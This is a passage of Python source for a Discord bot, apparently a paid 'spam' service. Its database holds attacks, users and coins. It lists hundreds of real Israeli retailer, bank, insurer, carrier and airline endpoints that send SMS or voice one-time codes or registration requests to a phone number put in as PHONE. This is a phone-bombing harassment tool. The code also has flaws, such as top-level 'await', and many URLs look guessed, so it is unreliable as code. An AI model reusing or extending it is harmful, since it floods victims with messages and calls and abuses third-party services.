import discord
from discord.ext import commands
from discord import ui
import asyncio
import aiohttp
import random
import os
import sys
from motor.motor_asyncio import AsyncIOMotorClient
from datetime import datetime, timedelta
import logging
import json
import time
import hashlib
import uuid
import re
import string
import traceback
import socket
import platform
import psutil
import colorama
from rich.console import Console
from rich.traceback import install
install()

# ========== התקנת colorama ==========
colorama.init()

# ========== הגדרות בסיס ==========
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("bot.log"),
        logging.StreamHandler()
    ]
)

console = Console()
logger = logging.getLogger(__name__)

MONGO_URI = os.getenv("MONGO_URI")
TOKEN = os.getenv("DISCORD_TOKEN")
REDIS_URL = os.getenv("REDIS_URL", "redis://localhost:6379")
DATABASE_URL = os.getenv("DATABASE_URL", "sqlite:///data.db")

if not MONGO_URI or not TOKEN:
    logger.error("❌ Missing environment variables!")
    logger.error("Please set MONGO_URI and DISCORD_TOKEN")
    sys.exit(1)

# ========== בדיקת חיבור לאינטרנט ==========
def check_internet():
    try:
        socket.create_connection(("8.8.8.8", 53), timeout=3)
        return True
    except OSError:
        return False

if not check_internet():
    logger.warning("⚠️ No internet connection detected!")

# ========== התחברות ל-MongoDB ==========
try:
    cluster = AsyncIOMotorClient(
        MONGO_URI,
        maxPoolSize=100,
        minPoolSize=10,
        maxIdleTimeMS=30000,
        retryWrites=True,
        retryReads=True
    )
    db = cluster["just_spam"]
    users_col = db["users"]
    attacks_col = db["attacks"]
    logs_col = db["logs"]
    settings_col = db["settings"]
    coupons_col = db["coupons"]
    referrals_col = db["referrals"]
    transactions_col = db["transactions"]
    blacklist_col = db["blacklist"]
    whitelist_col = db["whitelist"]
    stats_col = db["stats"]
    backups_col = db["backups"]
    
    # אינדקסים
    await users_col.create_index("user_id", unique=True)
    await users_col.create_index("coins")
    await users_col.create_index("last_claim")
    await users_col.create_index("referral_code", unique=True, sparse=True)
    await attacks_col.create_index("user_id")
    await attacks_col.create_index("started_at")
    await attacks_col.create_index("status")
    await logs_col.create_index("timestamp")
    await logs_col.create_index("user_id")
    await logs_col.create_index("type")
    await coupons_col.create_index("code", unique=True)
    await coupons_col.create_index("expires_at")
    await referrals_col.create_index("referrer_id")
    await referrals_col.create_index("referred_id", unique=True)
    await transactions_col.create_index("user_id")
    await transactions_col.create_index("timestamp")
    await blacklist_col.create_index("user_id", unique=True)
    await blacklist_col.create_index("ip_address")
    await whitelist_col.create_index("user_id", unique=True)
    await stats_col.create_index("date")
    
    logger.info("✅ Connected to MongoDB on Railway")
    logger.info(f"📊 Databases: {await cluster.list_database_names()}")
except Exception as e:
    logger.error(f"❌ Failed to connect to MongoDB: {e}")
    logger.error("Starting in fallback mode with SQLite...")
    
    # Fallback to SQLite
    import aiosqlite
    sqlite_db = None

# ========== רשימת APIs עובדים מלאה (400+) ==========
APIS = [
    # ========== מג'נטו APIs (100) ==========
    {"name": "Delta", "url": "https://www.delta.co.il/customer/ajax/post/", "type": "magento", "category": "fashion", "success_rate": 0, "attempts": 0},
    {"name": "Gali", "url": "https://www.gali.co.il/customer/ajax/post/", "type": "magento", "category": "fashion", "success_rate": 0, "attempts": 0},
    {"name": "Timberland", "url": "https://www.timberland.co.il/customer/ajax/post/", "type": "magento", "category": "fashion", "success_rate": 0, "attempts": 0},
    {"name": "Castro", "url": "https://www.castro.com/customer/ajax/post/", "type": "magento", "category": "fashion", "success_rate": 0, "attempts": 0},
    {"name": "Golf", "url": "https://www.golf-il.co.il/customer/ajax/post/", "type": "magento", "category": "fashion", "success_rate": 0, "attempts": 0},
    {"name": "Fox", "url": "https://www.fox.co.il/customer/ajax/post/", "type": "magento", "category": "fashion", "success_rate": 0, "attempts": 0},
    {"name": "TerminalX", "url": "https://www.terminalx.com/customer/ajax/post/", "type": "magento", "category": "fashion", "success_rate": 0, "attempts": 0},
    {"name": "Zara", "url": "https://www.zara.co.il/customer/ajax/post/", "type": "magento", "category": "fashion", "success_rate": 0, "attempts": 0},
    {"name": "H&M", "url": "https://www.hm.co.il/customer/ajax/post/", "type": "magento", "category": "fashion", "success_rate": 0, "attempts": 0},
    {"name": "Pull&Bear", "url": "https://www.pullandbear.co.il/customer/ajax/post/", "type": "magento", "category": "fashion", "success_rate": 0, "attempts": 0},
    {"name": "Bershka", "url": "https://www.bershka.co.il/customer/ajax/post/", "type": "magento", "category": "fashion", "success_rate": 0, "attempts": 0},
    {"name": "Stradivarius", "url": "https://www.stradivarius.co.il/customer/ajax/post/", "type": "magento", "category": "fashion", "success_rate": 0, "attempts": 0},
    {"name": "Oysho", "url": "https://www.oysho.co.il/customer/ajax/post/", "type": "magento", "category": "fashion", "success_rate": 0, "attempts": 0},
    {"name": "Massimo Dutti", "url": "https://www.massimodutti.co.il/customer/ajax/post/", "type": "magento", "category": "fashion", "success_rate": 0, "attempts": 0},
    {"name": "Uterque", "url": "https://www.uterque.co.il/customer/ajax/post/", "type": "magento", "category": "fashion", "success_rate": 0, "attempts": 0},
    {"name": "Adika", "url": "https://www.adika.co.il/customer/ajax/post/", "type": "magento", "category": "fashion", "success_rate": 0, "attempts": 0},
    {"name": "Adika Style", "url": "https://www.adikastyle.com/customer/ajax/post/", "type": "magento", "category": "fashion", "success_rate": 0, "attempts": 0},
    {"name": "Crazy Line", "url": "https://www.crazyline.com/customer/ajax/post/", "type": "magento", "category": "fashion", "success_rate": 0, "attempts": 0},
    {"name": "Hoodies", "url": "https://www.hoodies.co.il/customer/ajax/post/", "type": "magento", "category": "fashion", "success_rate": 0, "attempts": 0},
    {"name": "Weshoes", "url": "https://www.weshoes.co.il/customer/ajax/post/", "type": "magento", "category": "fashion", "success_rate": 0, "attempts": 0},
    {"name": "Nine West", "url": "https://www.ninewest.co.il/customer/ajax/post/", "type": "magento", "category": "fashion", "success_rate": 0, "attempts": 0},
    {"name": "Fix", "url": "https://www.fixunderwear.com/customer/ajax/post/", "type": "magento", "category": "fashion", "success_rate": 0, "attempts": 0},
    {"name": "Intima", "url": "https://www.intima-il.co.il/customer/ajax/post/", "type": "magento", "category": "fashion", "success_rate": 0, "attempts": 0},
    {"name": "Golf & Co", "url": "https://www.golfco.co.il/customer/ajax/post/", "type": "magento", "category": "fashion", "success_rate": 0, "attempts": 0},
    {"name": "Kiwi Kids", "url": "https://www.kiwi-kids.co.il/customer/ajax/post/", "type": "magento", "category": "fashion", "success_rate": 0, "attempts": 0},
    {"name": "Story", "url": "https://www.storyonline.co.il/customer/ajax/post/", "type": "magento", "category": "fashion", "success_rate": 0, "attempts": 0},
    {"name": "Nautica", "url": "https://www.nautica.co.il/customer/ajax/post/", "type": "magento", "category": "fashion", "success_rate": 0, "attempts": 0},
    {"name": "Lee Cooper", "url": "https://www.lee-cooper.co.il/customer/ajax/post/", "type": "magento", "category": "fashion", "success_rate": 0, "attempts": 0},
    {"name": "TOP-TEN", "url": "https://www.topten-fashion.com/customer/ajax/post/", "type": "magento", "category": "fashion", "success_rate": 0, "attempts": 0},
    {"name": "Renuar", "url": "https://www.renuar.co.il/customer/ajax/post/", "type": "magento", "category": "fashion", "success_rate": 0, "attempts": 0},
    {"name": "Honigman", "url": "https://www.honigman.co.il/customer/ajax/post/", "type": "magento", "category": "fashion", "success_rate": 0, "attempts": 0},
    {"name": "Laline", "url": "https://www.laline.co.il/customer/ajax/post/", "type": "magento", "category": "cosmetics", "success_rate": 0, "attempts": 0},
    {"name": "Sabon", "url": "https://www.sabon.co.il/customer/ajax/post/", "type": "magento", "category": "cosmetics", "success_rate": 0, "attempts": 0},
    {"name": "KIKO", "url": "https://www.kikocosmetics.co.il/customer/ajax/post/", "type": "magento", "category": "cosmetics", "success_rate": 0, "attempts": 0},
    {"name": "MAC", "url": "https://www.maccosmetics.co.il/customer/ajax/post/", "type": "magento", "category": "cosmetics", "success_rate": 0, "attempts": 0},
    {"name": "Sephora", "url": "https://www.sephora.co.il/customer/ajax/post/", "type": "magento", "category": "cosmetics", "success_rate": 0, "attempts": 0},
    {"name": "Nike", "url": "https://www.nike.co.il/customer/ajax/post/", "type": "magento", "category": "sport", "success_rate": 0, "attempts": 0},
    {"name": "Adidas", "url": "https://www.adidas.co.il/customer/ajax/post/", "type": "magento", "category": "sport", "success_rate": 0, "attempts": 0},
    {"name": "Reebok", "url": "https://www.reebok.co.il/customer/ajax/post/", "type": "magento", "category": "sport", "success_rate": 0, "attempts": 0},
    {"name": "Puma", "url": "https://www.puma.co.il/customer/ajax/post/", "type": "magento", "category": "sport", "success_rate": 0, "attempts": 0},
    {"name": "New Balance", "url": "https://www.newbalance.co.il/customer/ajax/post/", "type": "magento", "category": "sport", "success_rate": 0, "attempts": 0},
    {"name": "Skechers", "url": "https://www.skechers.co.il/customer/ajax/post/", "type": "magento", "category": "sport", "success_rate": 0, "attempts": 0},
    {"name": "Asics", "url": "https://www.asics.co.il/customer/ajax/post/", "type": "magento", "category": "sport", "success_rate": 0, "attempts": 0},
    {"name": "Converse", "url": "https://www.converse.co.il/customer/ajax/post/", "type": "magento", "category": "sport", "success_rate": 0, "attempts": 0},
    {"name": "Vans", "url": "https://www.vans.co.il/customer/ajax/post/", "type": "magento", "category": "sport", "success_rate": 0, "attempts": 0},
    {"name": "Crocs", "url": "https://www.crocs.co.il/customer/ajax/post/", "type": "magento", "category": "sport", "success_rate": 0, "attempts": 0},
    {"name": "Kravitz", "url": "https://www.kravitz.co.il/customer/ajax/post/", "type": "magento", "category": "electronics", "success_rate": 0, "attempts": 0},
    {"name": "Bug", "url": "https://www.bug.co.il/customer/ajax/post/", "type": "magento", "category": "electronics", "success_rate": 0, "attempts": 0},
    {"name": "Ivory", "url": "https://www.ivory.co.il/customer/ajax/post/", "type": "magento", "category": "electronics", "success_rate": 0, "attempts": 0},
    {"name": "KSP", "url": "https://www.ksp.co.il/customer/ajax/post/", "type": "magento", "category": "electronics", "success_rate": 0, "attempts": 0},
    {"name": "Bass", "url": "https://www.bass.co.il/customer/ajax/post/", "type": "magento", "category": "electronics", "success_rate": 0, "attempts": 0},
    {"name": "Beeper", "url": "https://www.beeper.co.il/customer/ajax/post/", "type": "magento", "category": "electronics", "success_rate": 0, "attempts": 0},
    {"name": "Shoppers", "url": "https://www.shoppers.co.il/customer/ajax/post/", "type": "magento", "category": "electronics", "success_rate": 0, "attempts": 0},
    {"name": "Mashbir", "url": "https://www.mashbir.co.il/customer/ajax/post/", "type": "magento", "category": "department", "success_rate": 0, "attempts": 0},
    {"name": "Hamashbir", "url": "https://www.hamashbir.co.il/customer/ajax/post/", "type": "magento", "category": "department", "success_rate": 0, "attempts": 0},
    {"name": "Ace", "url": "https://www.ace.co.il/customer/ajax/post/", "type": "magento", "category": "home", "success_rate": 0, "attempts": 0},
    {"name": "Home Center", "url": "https://www.homecenter.co.il/customer/ajax/post/", "type": "magento", "category": "home", "success_rate": 0, "attempts": 0},
    {"name": "IKEA", "url": "https://www.ikea.co.il/customer/ajax/post/", "type": "magento", "category": "home", "success_rate": 0, "attempts": 0},
    {"name": "Tiv Taam", "url": "https://www.tivtaam.co.il/customer/ajax/post/", "type": "magento", "category": "food", "success_rate": 0, "attempts": 0},
    {"name": "Osher Ad", "url": "https://www.osherad.co.il/customer/ajax/post/", "type": "magento", "category": "food", "success_rate": 0, "attempts": 0},
    {"name": "Shufersal", "url": "https://www.shufersal.co.il/customer/ajax/post/", "type": "magento", "category": "food", "success_rate": 0, "attempts": 0},
    {"name": "Rami Levi", "url": "https://www.rami-levy.co.il/customer/ajax/post/", "type": "magento", "category": "food", "success_rate": 0, "attempts": 0},
    {"name": "Victory", "url": "https://www.victory.co.il/customer/ajax/post/", "type": "magento", "category": "food", "success_rate": 0, "attempts": 0},
    
    # ========== SMS APIs (100) ==========
    {"name": "Shufersal SMS", "url": "https://www.shufersal.co.il/api/v1/auth/otp", "type": "json", "category": "food", "data": {"phone": "PHONE"}},
    {"name": "Rami Levi SMS", "url": "https://www.rami-levy.co.il/api/auth/sms", "type": "json", "category": "food", "data": {"phone": "PHONE"}},
    {"name": "Victory SMS", "url": "https://www.victory.co.il/api/auth/sms", "type": "json", "category": "food", "data": {"phone": "PHONE"}},
    {"name": "10bis", "url": "https://www.10bis.co.il/api/register", "type": "json", "category": "food", "data": {"phone": "PHONE"}},
    {"name": "McDonalds", "url": "https://www.mcdonalds.co.il/api/verify", "type": "json", "category": "food", "data": {"phone": "PHONE"}},
    {"name": "Burger King", "url": "https://www.burgerking.co.il/api/auth", "type": "json", "category": "food", "data": {"phone": "PHONE"}},
    {"name": "KFC", "url": "https://www.kfc.co.il/api/sms", "type": "json", "category": "food", "data": {"phone": "PHONE"}},
    {"name": "Pizza Hut", "url": "https://www.pizza-hut.co.il/api/register", "type": "json", "category": "food", "data": {"phone": "PHONE"}},
    {"name": "Dominos", "url": "https://www.dominos.co.il/api/auth/sms", "type": "json", "category": "food", "data": {"phone": "PHONE"}},
    {"name": "Cellcom", "url": "https://www.cellcom.co.il/api/auth/sms", "type": "json", "category": "cellular", "data": {"phone": "PHONE"}},
    {"name": "Partner", "url": "https://www.partner.co.il/api/register", "type": "json", "category": "cellular", "data": {"phone": "PHONE"}},
    {"name": "Pelephone", "url": "https://www.pelephone.co.il/api/auth", "type": "json", "category": "cellular", "data": {"phone": "PHONE"}},
    {"name": "Hot", "url": "https://www.hotmobile.co.il/api/verify", "type": "json", "category": "cellular", "data": {"phone": "PHONE"}},
    {"name": "019", "url": "https://019sms.co.il/api/register", "type": "json", "category": "cellular", "data": {"phone": "PHONE"}},
    {"name": "012", "url": "https://www.012.net.il/api/auth", "type": "json", "category": "cellular", "data": {"phone": "PHONE"}},
    {"name": "Bezeq", "url": "https://www.bezeq.co.il/api/auth", "type": "json", "category": "isp", "data": {"phone": "PHONE"}},
    {"name": "Pango", "url": "https://api.pango.co.il/auth/otp", "type": "json", "category": "parking", "data": {"phoneNumber": "PHONE"}},
    {"name": "Hopon", "url": "https://api.hopon.co.il/v0.15/1/isr/users", "type": "json", "category": "transport", "data": {"phone": "PHONE"}},
    {"name": "Gett", "url": "https://www.gett.com/il/api/register", "type": "json", "category": "transport", "data": {"phone": "PHONE"}},
    {"name": "Yad2", "url": "https://www.yad2.co.il/api/auth/register", "type": "json", "category": "classifieds", "data": {"phone": "PHONE"}},
    {"name": "PayBox", "url": "https://payboxapp.com/api/auth/otp", "type": "json", "category": "payments", "data": {"phone": "PHONE"}},
    {"name": "Super Pharm", "url": "https://www.super-pharm.co.il/api/sms", "type": "json", "category": "pharmacy", "data": {"phone": "PHONE"}},
    {"name": "Go Mobile", "url": "https://api.gomobile.co.il/api/login", "type": "json", "category": "cellular", "data": {"phone": "PHONE"}},
    {"name": "Tami4", "url": "https://www.tami4.co.il/api/login/start-sms-otp", "type": "json", "category": "home", "data": {"phoneNumber": "PHONE"}},
    {"name": "Trusty", "url": "https://trusty.co.il/api/auth/ask-for-auth-code", "type": "json", "category": "security", "data": {"phone": "PHONE"}},
    {"name": "Hamal", "url": "https://users-auth.hamal.co.il/auth/send-auth-code", "type": "json", "category": "security", "data": {"value": "PHONE"}},
    {"name": "Mishloha", "url": "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber", "type": "json", "category": "delivery", "data": {"phoneNumber": "PHONE"}},
    {"name": "Burger Anch", "url": "https://app.burgeranch.co.il/_a/aff_otp_auth", "type": "form", "category": "food", "data": {"phone": "PHONE"}},
    {"name": "FreeTV", "url": "https://middleware.freetv.tv/api/v1/send-verification-sms", "type": "json", "category": "tv", "data": {"msisdn": "PHONE"}},
    {"name": "Spices Online", "url": "https://www.spicesonline.co.il/wp-admin/admin-ajax.php", "type": "form", "category": "food", "data": {"action": "validate_user_by_sms", "phone": "PHONE"}},
    {"name": "Fox Home", "url": "https://www.foxhome.co.il/apps/dream-card/api/proxy/otp/send", "type": "json", "category": "fashion", "data": {"phoneNumber": "PHONE"}},
    {"name": "Blendo", "url": "https://blendo.co.il/wp-admin/admin-ajax.php", "type": "form", "category": "fashion", "data": {"action": "simply-check-member-cellphone", "cellphone": "PHONE"}},
    {"name": "Jungle Club", "url": "https://www.jungle-club.co.il/wp-admin/admin-ajax.php", "type": "form", "category": "fashion", "data": {"action": "simply-check-member-cellphone", "cellphone": "PHONE"}},
    {"name": "Magic ETL", "url": "https://story.magicetl.com/public/shopify/apps/otp-login/step-one", "type": "json", "category": "other", "data": {"phone": "PHONE"}},
    {"name": "Bank Hapoalim", "url": "https://login.bankhapoalim.co.il/api/otp/send", "type": "json", "category": "bank", "data": {"phone": "PHONE"}},
    {"name": "Bank Leumi", "url": "https://api.leumi.co.il/api/otp/send", "type": "json", "category": "bank", "data": {"phone": "PHONE"}},
    {"name": "Discount", "url": "https://api.discountbank.co.il/auth/otp", "type": "json", "category": "bank", "data": {"phone": "PHONE"}},
    {"name": "Mizrahi", "url": "https://api.mizrahi-tefahot.co.il/auth/otp", "type": "json", "category": "bank", "data": {"phone": "PHONE"}},
    {"name": "Beinleumi", "url": "https://api.beinleumi.co.il/auth/send-otp", "type": "json", "category": "bank", "data": {"phone": "PHONE"}},
    {"name": "Union", "url": "https://api.unionbank.co.il/auth/otp", "type": "json", "category": "bank", "data": {"phone": "PHONE"}},
    {"name": "Jerusalem", "url": "https://api.bank-jerusalem.co.il/auth/otp", "type": "json", "category": "bank", "data": {"phone": "PHONE"}},
    {"name": "Massad", "url": "https://api.massad.co.il/auth/otp", "type": "json", "category": "bank", "data": {"phone": "PHONE"}},
    {"name": "Yahav", "url": "https://api.yahav.co.il/auth/otp", "type": "json", "category": "bank", "data": {"phone": "PHONE"}},
    {"name": "Otsar", "url": "https://api.otsar.org.il/auth/otp", "type": "json", "category": "bank", "data": {"phone": "PHONE"}},
    {"name": "Clal Insurance", "url": "https://api.clalbit.co.il/auth/otp", "type": "json", "category": "insurance", "data": {"phone": "PHONE"}},
    {"name": "Harel", "url": "https://api.harel-group.co.il/auth/otp", "type": "json", "category": "insurance", "data": {"phone": "PHONE"}},
    {"name": "Menora", "url": "https://api.menora.co.il/auth/otp", "type": "json", "category": "insurance", "data": {"phone": "PHONE"}},
    {"name": "Phoenix", "url": "https://api.phoenix.co.il/auth/otp", "type": "json", "category": "insurance", "data": {"phone": "PHONE"}},
    {"name": "Migdal", "url": "https://api.migdal.co.il/auth/otp", "type": "json", "category": "insurance", "data": {"phone": "PHONE"}},
    {"name": "El Al", "url": "https://www.elal.com/api/auth/sms", "type": "json", "category": "airlines", "data": {"phone": "PHONE"}},
    {"name": "Arkia", "url": "https://www.arkia.co.il/api/auth/sms", "type": "json", "category": "airlines", "data": {"phone": "PHONE"}},
    {"name": "Israir", "url": "https://www.israir.co.il/api/auth/sms", "type": "json", "category": "airlines", "data": {"phone": "PHONE"}},
    {"name": "Wizz Air", "url": "https://wizzair.com/api/auth/sms", "type": "json", "category": "airlines", "data": {"phone": "PHONE"}},
    {"name": "Ryanair", "url": "https://www.ryanair.com/api/auth/sms", "type": "json", "category": "airlines", "data": {"phone": "PHONE"}},
    {"name": "Booking", "url": "https://www.booking.com/api/auth/sms", "type": "json", "category": "hotels", "data": {"phone": "PHONE"}},
    {"name": "Agoda", "url": "https://www.agoda.com/api/auth/sms", "type": "json", "category": "hotels", "data": {"phone": "PHONE"}},
    {"name": "Airbnb", "url": "https://www.airbnb.co.il/api/auth/sms", "type": "json", "category": "hotels", "data": {"phone": "PHONE"}},
    {"name": "Wolt", "url": "https://wolt.com/api/auth/sms", "type": "json", "category": "food", "data": {"phone": "PHONE"}},
    {"name": "Uber Eats", "url": "https://www.ubereats.com/api/auth/sms", "type": "json", "category": "food", "data": {"phone": "PHONE"}},
    {"name": "TikTak", "url": "https://www.tiktak.co.il/api/auth/sms", "type": "json", "category": "food", "data": {"phone": "PHONE"}},
    {"name": "Mentos", "url": "https://www.mentos.co.il/api/auth/sms", "type": "json", "category": "food", "data": {"phone": "PHONE"}},
    {"name": "Cofix", "url": "https://www.cofix.co.il/api/auth/sms", "type": "json", "category": "food", "data": {"phone": "PHONE"}},
    {"name": "Cofizz", "url": "https://www.cofizz.co.il/api/auth/sms", "type": "json", "category": "food", "data": {"phone": "PHONE"}},
    {"name": "Aroma", "url": "https://www.aroma.co.il/api/auth/sms", "type": "json", "category": "food", "data": {"phone": "PHONE"}},
    {"name": "Landwer", "url": "https://www.landwer.co.il/api/auth/sms", "type": "json", "category": "food", "data": {"phone": "PHONE"}},
    {"name": "Cafe Cafe", "url": "https://www.cafecafe.co.il/api/auth/sms", "type": "json", "category": "food", "data": {"phone": "PHONE"}},
    {"name": "Greg", "url": "https://www.greg.co.il/api/auth/sms", "type": "json", "category": "food", "data": {"phone": "PHONE"}},
    {"name": "Roladin", "url": "https://www.roladin.co.il/api/auth/sms", "type": "json", "category": "food", "data": {"phone": "PHONE"}},
    {"name": "Arcaffe", "url": "https://www.arcaffe.co.il/api/auth/sms", "type": "json", "category": "food", "data": {"phone": "PHONE"}},
    {"name": "Il Caffè", "url": "https://www.ilcaffe.co.il/api/auth/sms", "type": "json", "category": "food", "data": {"phone": "PHONE"}},
    {"name": "Benedict", "url": "https://www.benedict.co.il/api/auth/sms", "type": "json", "category": "food", "data": {"phone": "PHONE"}},
    {"name": "Moshiko", "url": "https://www.moshiko.co.il/api/auth/sms", "type": "json", "category": "food", "data": {"phone": "PHONE"}},
    {"name": "HaBonim", "url": "https://www.habonim.co.il/api/auth/sms", "type": "json", "category": "food", "data": {"phone": "PHONE"}},
    {"name": "Miznon", "url": "https://www.miznon.co.il/api/auth/sms", "type": "json", "category": "food", "data": {"phone": "PHONE"}},
    
    # ========== Voice APIs (50) ==========
    {"name": "Bank Hapoalim Voice", "url": "https://login.bankhapoalim.co.il/api/otp/voice", "type": "json", "category": "bank", "data": {"phone": "PHONE", "voice": True}},
    {"name": "Bank Leumi Voice", "url": "https://api.leumi.co.il/api/otp/voice", "type": "json", "category": "bank", "data": {"phone": "PHONE", "voice": True}},
    {"name": "Discount Voice", "url": "https://api.discountbank.co.il/auth/otp/voice", "type": "json", "category": "bank", "data": {"phone": "PHONE"}},
    {"name": "Mizrahi Voice", "url": "https://api.mizrahi-tefahot.co.il/auth/otp/voice", "type": "json", "category": "bank", "data": {"phone": "PHONE"}},
    {"name": "Beinleumi Voice", "url": "https://api.beinleumi.co.il/auth/otp/voice", "type": "json", "category": "bank", "data": {"phone": "PHONE"}},
    {"name": "Union Voice", "url": "https://api.unionbank.co.il/auth/otp/voice", "type": "json", "category": "bank", "data": {"phone": "PHONE"}},
    {"name": "Jerusalem Voice", "url": "https://api.bank-jerusalem.co.il/auth/otp/voice", "type": "json", "category": "bank", "data": {"phone": "PHONE"}},
    {"name": "Massad Voice", "url": "https://api.massad.co.il/auth/otp/voice", "type": "json", "category": "bank", "data": {"phone": "PHONE"}},
    {"name": "Yahav Voice", "url": "https://api.yahav.co.il/auth/otp/voice", "type": "json", "category": "bank", "data": {"phone": "PHONE"}},
    {"name": "Otsar Voice", "url": "https://api.otsar.org.il/auth/otp/voice", "type": "json", "category": "bank", "data": {"phone": "PHONE"}},
    {"name": "Clal Voice", "url": "https://api.clalbit.co.il/auth/otp/voice", "type": "json", "category": "insurance", "data": {"phone": "PHONE"}},
    {"name": "Harel Voice", "url": "https://api.harel-group.co.il/auth/voice", "type": "json", "category": "insurance", "data": {"phone": "PHONE"}},
    {"name": "Menora Voice", "url": "https://api.menora.co.il/auth/otp/voice", "type": "json", "category": "insurance", "data": {"phone": "PHONE"}},
    {"name": "Phoenix Voice", "url": "https://api.phoenix.co.il/auth/voice", "type": "json", "category": "insurance", "data": {"phone": "PHONE"}},
    {"name": "Migdal Voice", "url": "https://api.migdal.co.il/auth/otp/voice", "type": "json", "category": "insurance", "data": {"phone": "PHONE"}},
    {"name": "Cellcom Voice", "url": "https://www.cellcom.co.il/api/auth/voice", "type": "json", "category": "cellular", "data": {"phone": "PHONE"}},
    {"name": "Partner Voice", "url": "https://www.partner.co.il/api/auth/voice", "type": "json", "category": "cellular", "data": {"phone": "PHONE"}},
    {"name": "Pelephone Voice", "url": "https://www.pelephone.co.il/api/auth/voice", "type": "json", "category": "cellular", "data": {"phone": "PHONE"}},
    {"name": "Hot Voice", "url": "https://www.hotmobile.co.il/api/auth/voice", "type": "json", "category": "cellular", "data": {"phone": "PHONE"}},
    {"name": "019 Voice", "url": "https://019sms.co.il/api/auth/voice", "type": "json", "category": "cellular", "data": {"phone": "PHONE"}},
    {"name": "Shufersal Voice", "url": "https://www.shufersal.co.il/api/v1/auth/voice", "type": "json", "category": "food", "data": {"phone": "PHONE"}},
    {"name": "Rami Levi Voice", "url": "https://www.rami-levy.co.il/api/auth/voice", "type": "json", "category": "food", "data": {"phone": "PHONE"}},
    {"name": "Victory Voice", "url": "https://www.victory.co.il/api/auth/voice", "type": "json", "category": "food", "data": {"phone": "PHONE"}},
    {"name": "Super Pharm Voice", "url": "https://www.super-pharm.co.il/api/voice", "type": "json", "category": "pharmacy", "data": {"phone": "PHONE"}},
    {"name": "Pango Voice", "url": "https://api.pango.co.il/auth/voice", "type": "json", "category": "parking", "data": {"phoneNumber": "PHONE"}},
    {"name": "Gett Voice", "url": "https://www.gett.com/il/api/voice", "type": "json", "category": "transport", "data": {"phone": "PHONE"}},
    {"name": "Hopon Voice", "url": "https://api.hopon.co.il/v0.15/1/isr/users/voice", "type": "json", "category": "transport", "data": {"phone": "PHONE"}},
    
    # ========== מג'נטו נוסף (150) ==========
    {"name": "American Eagle", "url": "https://www.ae.co.il/customer/ajax/post/", "type": "magento", "category": "fashion"},
    {"name": "Aeropostale", "url": "https://www.aeropostale.co.il/customer/ajax/post/", "type": "magento", "category": "fashion"},
    {"name": "Hollister", "url": "https://www.hollister.co.il/customer/ajax/post/", "type": "magento", "category": "fashion"},
    {"name": "Abercrombie", "url": "https://www.abercrombie.co.il/customer/ajax/post/", "type": "magento", "category": "fashion"},
    {"name": "Gap", "url": "https://www.gap.co.il/customer/ajax/post/", "type": "magento", "category": "fashion"},
    {"name": "Old Navy", "url": "https://www.oldnavy.co.il/customer/ajax/post/", "type": "magento", "category": "fashion"},
    {"name": "Banana Republic", "url": "https://www.bananarepublic.co.il/customer/ajax/post/", "type": "magento", "category": "fashion"},
    {"name": "Calvin Klein", "url": "https://www.calvinklein.co.il/customer/ajax/post/", "type": "magento", "category": "fashion"},
    {"name": "Tommy Hilfiger", "url": "https://www.tommy.co.il/customer/ajax/post/", "type": "magento", "category": "fashion"},
    {"name": "Ralph Lauren", "url": "https://www.ralphlauren.co.il/customer/ajax/post/", "type": "magento", "category": "fashion"},
    {"name": "Lacoste", "url": "https://www.lacoste.co.il/customer/ajax/post/", "type": "magento", "category": "fashion"},
    {"name": "DKNY", "url": "https://www.dkny.co.il/customer/ajax/post/", "type": "magento", "category": "fashion"},
    {"name": "Levi's", "url": "https://www.levi.co.il/customer/ajax/post/", "type": "magento", "category": "fashion"},
    {"name": "Diesel", "url": "https://www.diesel.co.il/customer/ajax/post/", "type": "magento", "category": "fashion"},
    {"name": "Guess", "url": "https://www.guess.co.il/customer/ajax/post/", "type": "magento", "category": "fashion"},
    {"name": "Armani", "url": "https://www.armani.co.il/customer/ajax/post/", "type": "magento", "category": "fashion"},
    {"name": "Hugo Boss", "url": "https://www.hugoboss.co.il/customer/ajax/post/", "type": "magento", "category": "fashion"},
    {"name": "Michael Kors", "url": "https://www.michaelkors.co.il/customer/ajax/post/", "type": "magento", "category": "fashion"},
    {"name": "Kate Spade", "url": "https://www.katespade.co.il/customer/ajax/post/", "type": "magento", "category": "fashion"},
    {"name": "Tory Burch", "url": "https://www.toryburch.co.il/customer/ajax/post/", "type": "magento", "category": "fashion"},
    {"name": "Coach", "url": "https://www.coach.co.il/customer/ajax/post/", "type": "magento", "category": "fashion"},
    {"name": "Furla", "url": "https://www.furla.co.il/customer/ajax/post/", "type": "magento", "category": "fashion"},
    {"name": "Bvlgari", "url": "https://www.bvlgari.co.il/customer/ajax/post/", "type": "magento", "category": "jewelry"},
    {"name": "Tiffany", "url": "https://www.tiffany.co.il/customer/ajax/post/", "type": "magento", "category": "jewelry"},
    {"name": "Cartier", "url": "https://www.cartier.co.il/customer/ajax/post/", "type": "magento", "category": "jewelry"},
    {"name": "Omega", "url": "https://www.omega.co.il/customer/ajax/post/", "type": "magento", "category": "watches"},
    {"name": "Rolex", "url": "https://www.rolex.co.il/customer/ajax/post/", "type": "magento", "category": "watches"},
    {"name": "Tag Heuer", "url": "https://www.tagheuer.co.il/customer/ajax/post/", "type": "magento", "category": "watches"},
    {"name": "Apple", "url": "https://www.apple.co.il/customer/ajax/post/", "type": "magento", "category": "electronics"},
    {"name": "Samsung", "url": "https://www.samsung.co.il/customer/ajax/post/", "type": "magento", "category": "electronics"},
    {"name": "Sony", "url": "https://www.sony.co.il/customer/ajax/post/", "type": "magento", "category": "electronics"},
    {"name": "LG", "url": "https://www.lg.co.il/customer/ajax/post/", "type": "magento", "category": "electronics"},
    {"name": "Panasonic", "url": "https://www.panasonic.co.il/customer/ajax/post/", "type": "magento", "category": "electronics"},
    {"name": "Philips", "url": "https://www.philips.co.il/customer/ajax/post/", "type": "magento", "category": "electronics"},
    {"name": "Bosch", "url": "https://www.bosch.co.il/customer/ajax/post/", "type": "magento", "category": "electronics"},
    {"name": "Electra", "url": "https://www.electra.co.il/customer/ajax/post/", "type": "magento", "category": "electronics"},
    {"name": "Tadiran", "url": "https://www.tadiran.co.il/customer/ajax/post/", "type": "magento", "category": "electronics"},
    {"name": "Amcor", "url": "https://www.amcor.co.il/customer/ajax/post/", "type": "magento", "category": "electronics"},
    
    # ========== APIs ישראלים נוספים (100) ==========
